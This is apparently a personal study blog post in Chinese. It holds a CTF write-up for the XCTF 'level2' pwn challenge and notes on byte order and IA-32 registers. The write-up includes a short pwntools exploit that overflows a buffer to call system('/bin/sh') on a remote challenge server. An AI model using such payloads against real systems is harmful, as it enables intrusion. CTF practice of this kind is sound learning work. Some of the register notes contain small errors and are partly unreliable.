---
title: 7-24
abbrlink: 51850
hidden: true
date: 2020-07-24 15:00:30
---

# pwn题：[level2](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5055&page=1)
![UxOJdx.png](https://s1.ax1x.com/2020/07/25/UxOJdx.png)

用ida打开，发现vulnerable()里长这样:   
![UxLKKA.png](https://s1.ax1x.com/2020/07/25/UxLKKA.png)   
考虑可以把函数的返回地址修改为system()的地址，再把参数变为”/bin/sh“   
![UxLMDI.png](https://s1.ax1x.com/2020/07/25/UxLMDI.png)

exp：   
```
p = remote("220.249.52.133", 31379)
a = "1"*0x8c + p32(0x08048320) + p32(0) + p32(0x0804A024)
//或者a = '1' * 0x8c + p32(0x0804845c) + p32(0x0804A024)
p.recv()
p.sendline(a)
p.interactive()
```

还是有些不太懂的地方

# 逆向工程核心原理
## 小端序标记法
字节序是多字节数据在计算机内存中储存或网络传输时各字节的储存顺序，主要分为两类：小端序(little endian)和大端序(big endian)。

### 字节序
采用大端序存储数据时，内存地址低位存储数据的高位，内存地址高位存储数据的低位；采用小端序存储数据时，地址高位存储数据的高位，地址低位存储数据的低位。     
数据为单一字节时无论采用大端序还是小端序保存，字节存储顺序都一样。字符数组在内存中时连续的，向字符数组存放数据，无论采用大端序还是小端序，存储顺序都相同。
#### 大端序和小端序
网络协议中经常采用大端序方式，通过网络传输应用程序使用数据时，往往需要修改字节序。   
小端序采用逆序方式存储数据，使用小端序进行算数运算以及扩展、缩小数据时，效率非常高   

## IA-32寄存器
Intel Architecture 32位   
### 通用寄存器
通用寄存器用于传送和暂存数据，也可参与算术逻辑运算，并保存运算结果。IA-32中每个通用寄存器的大小都是32位，即4个字节，用于保存常量与地址等。   
```
EAX:(0~31)32位
AX:(0~15)EXAX的低16位
AH:(8~15)AX的高8位
AL:(0~7)AX的低8位
```

```
EAX:针对操作数和结果数据的累加器
EBX:DS段中的数据指针基址寄存器
ECX:字符串和循环操作的计数器
EDX:io指针数据寄存器
此外，ECX和EAX也可以用于特殊用途。LOOP命令中，ECX用来循环计数，每执行一次循环，ECX都会减一；EAX一般用在函数返回值中，所有WIN32 API函数都会先把返回值保存到EAX再返回。

以下4个寄存器主要用作保存内存地址的指针
EBP:扩展基址指针寄存器
ESI:源变址寄存器
EDI:目的变址寄存器
ESP:栈指针寄存器

ESP表示栈区域的基地址，函数被调用时保存ESP的值，返回时再把值返回ESP（称为栈帧技术）   
EBP和EDI与特定指令使用，用于内存复制   
```

#### 段寄存器
段是一种内存保护技术。它把内存划分为多个区段，并为每个段赋予起始地址、范围、访问权限等。   
段与分页技术一起用于将虚拟内存变更为实际物理内存。段内存记录在段描述符表中，段寄存器就持有这些段描述符表的索引   

段寄存器总共有6种寄存器：   
```
CS:代码段寄存器        存放应用程序代码所在段的段基址
SS:栈段寄存器          存放栈段的段基址
DS:数据段寄存器        存放数据段的段基址
ES:附加数据段寄存器     存放程序使用的附加数据段的段基址
FS:数据段寄存器        ``
GS:数据段寄存器        ``
```
每个寄存器的大小为16位（2个字节），每个段寄存器指向的段描述符与虚拟内存结合，形成一个线性地址，借助分页技术转换为物理地址   

